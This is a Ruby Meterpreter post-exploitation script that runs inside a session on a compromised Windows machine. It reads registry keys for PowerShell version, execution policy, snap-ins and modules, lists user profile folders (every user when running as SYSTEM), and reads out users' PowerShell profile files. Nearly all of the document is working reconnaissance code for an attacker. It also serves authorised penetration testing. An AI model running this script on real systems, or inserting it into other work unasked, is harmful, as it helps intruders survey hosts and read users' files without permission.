#Meterpreter script for enumerating Microsoft Powershell settings.
#Provided by Carlos Perez at carlos_perez[at]darkoperator[dot]com
@client = client

@@exec_opts = Rex::Parser::Arguments.new(
	"-h" => [ false,"Help menu." ]
)

@@exec_opts.parse(args) { |opt, idx, val|
	case opt
	when "-h"
		print_line("enum_scripting_env -- Enumerates PowerShell and WSH Configurations")
		print_line("USAGE: run enum_scripting_env")
		print_line(@@exec_opts.usage)
		raise Rex::Script::Completed
	end
}
#Support Functions
#-------------------------------------------------------------------------------
def enum_users
	os = @client.sys.config.sysinfo['OS']
	users = []
	user = @client.sys.config.getuid
	path4users = ""
	sysdrv = @client.fs.file.expand_path("%SystemDrive%")

	if os =~ /Windows 7|Vista|2008/
		path4users = sysdrv + "\\Users\\"
		profilepath = "\\Documents\\WindowsPowerShell\\"
	else
		path4users = sysdrv + "\\Documents and Settings\\"
		profilepath = "\\My Documents\\WindowsPowerShell\\"
	end

	if is_system?
		print_status("Running as SYSTEM extracting user list..")
		@client.fs.dir.foreach(path4users) do |u|
			userinfo = {}
			next if u =~ /^(\.|\.\.|All Users|Default|Default User|Public|desktop.ini|LocalService|NetworkService)$/
			userinfo['username'] = u
			userinfo['userappdata'] = path4users + u + profilepath
			users << userinfo
		end
	else
		userinfo = {}
		uservar = @client.fs.file.expand_path("%USERNAME%")
		userinfo['username'] = uservar
		userinfo['userappdata'] = path4users + uservar + profilepath
		users << userinfo
	end
	return users
end



#-------------------------------------------------------------------------------
def enum_powershell
	#Check if PowerShell is Installed
	if registry_enumkeys("HKLM\\SOFTWARE\\Microsoft\\").include?("PowerShell")
		print_status("Powershell is Installed on this system.")
		powershell_version = registry_getvaldata("HKLM\\SOFTWARE\\Microsoft\\PowerShell\\1\\PowerShellEngine","PowerShellVersion")
		print_status("Version: #{powershell_version}")
		#Get PowerShell Execution Policy
		begin
			powershell_policy = registry_getvaldata("HKLM\\SOFTWARE\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell","ExecutionPolicy")
		rescue
			powershell_policy = "Restricted"
		end
		print_status("Execution Policy: #{powershell_policy}")
		powershell_path = registry_getvaldata("HKLM\\SOFTWARE\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell","Path")
		print_status("Path: #{powershell_path}")
		if registry_enumkeys("HKLM\\SOFTWARE\\Microsoft\\PowerShell\\1").include?("PowerShellSnapIns")
			print_status("Powershell Snap-Ins:")
			registry_enumkeys("HKLM\\SOFTWARE\\Microsoft\\PowerShell\\1\\PowerShellSnapIns").each do |si|
				print_status("\tSnap-In: #{si}")
				registry_enumvals("HKLM\\SOFTWARE\\Microsoft\\PowerShell\\1\\PowerShellSnapIns\\#{si}").each do |v|
					print_status("\t\t#{v}: #{registry_getvaldata("HKLM\\SOFTWARE\\Microsoft\\PowerShell\\1\\PowerShellSnapIns\\#{si}",v)}")
				end
			end
		else
			print_status("No PowerShell Snap-Ins are installed")

		end
		if powershell_version =~ /2./
			print_status("Powershell Modules:")
			powershell_module_path = @client.fs.file.expand_path("%PSModulePath%")
			@client.fs.dir.foreach(powershell_module_path) do |m|
				next if m =~ /^(\.|\.\.)$/
				print_status("\t#{m}")
			end
		end
		tmpout = []
		print_status("Checking if users have Powershell profiles")
		enum_users.each do |u|
			print_status("Checking #{u['username']}")
			begin
			@client.fs.dir.foreach(u["userappdata"]) do |p|
				next if p =~ /^(\.|\.\.)$/
				if p =~ /Microsoft.PowerShell_profile.ps1/
					ps_profile = session.fs.file.new("#{u["userappdata"]}Microsoft.PowerShell_profile.ps1", "rb")
					until ps_profile.eof?
						tmpout << ps_profile.read
					end
					ps_profile.close
					if tmpout.length == 1
						print_status("Profile for #{u["username"]} not empty, it contains:")
						tmpout.each do |l|
							print_status("\t#{l.strip}")
						end
					end
				end
			end
			rescue
			end
		end


	end
end
if client.platform =~ /win32|win64/
	enum_powershell
else
	print_error("This version of Meterpreter is not supported with this Script!")
	raise Rex::Script::Completed
end
